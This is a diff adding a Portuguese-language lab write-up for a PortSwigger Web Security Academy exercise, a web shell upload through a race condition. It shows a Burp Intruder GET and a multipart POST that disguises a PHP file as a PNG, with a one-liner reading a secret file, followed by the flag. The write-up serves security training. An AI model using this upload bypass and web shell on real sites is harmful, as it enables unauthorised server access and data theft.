@@ -309,4 +309,61 @@ wYlMxt6LbnTxYyM6MJLtc4yXLIbvJdh6
 
 Flag: `e4X7zfE6kout4qJXeIl53uRdOZuF7e3r`
 
-### >> 7.
+### >> 7. Web shell upload via race condition
+
+Envie para o Intruder a requisição GET e inicie a o ataque
+````
+GET /files/avatars/pizza.php HTTP/1.1
+Host: acbe1f4b1e086478c0a92692004d00be.web-security-academy.net
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Connection: close
+
+
+````
+
+Crie uma requisição POST
+````
+POST /my-account/avatar HTTP/1.1
+Host: acbe1f4b1e086478c0a92692004d00be.web-security-academy.net
+Cookie: session=gBK9dlWNwY8urA2E7ctQF8WVvlfDl1Qq
+Content-Length: 460
+Cache-Control: max-age=0
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://acbe1f4b1e086478c0a92692004d00be.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRdUCY49NuOd1fNFA
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://acbe1f4b1e086478c0a92692004d00be.web-security-academy.net/my-account
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+------WebKitFormBoundaryRdUCY49NuOd1fNFA
+Content-Disposition: form-data; name="avatar"; filename="pizza.php"
+Content-Type: image/png
+
+ <?php echo file_get_contents('/home/carlos/secret'); ?>
+------WebKitFormBoundaryRdUCY49NuOd1fNFA
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundaryRdUCY49NuOd1fNFA
+Content-Disposition: form-data; name="csrf"
+
+rXWNyBHwjrmPCnr1UWmHhUWLJeUOVWPL
+------WebKitFormBoundaryRdUCY49NuOd1fNFA--
+````
+
+Após alguns segundos o retorno 200 aparece com a flag
+
+Flag: `qgwDkCdB1KpCloW81AVQE263QNw8uGsZ`
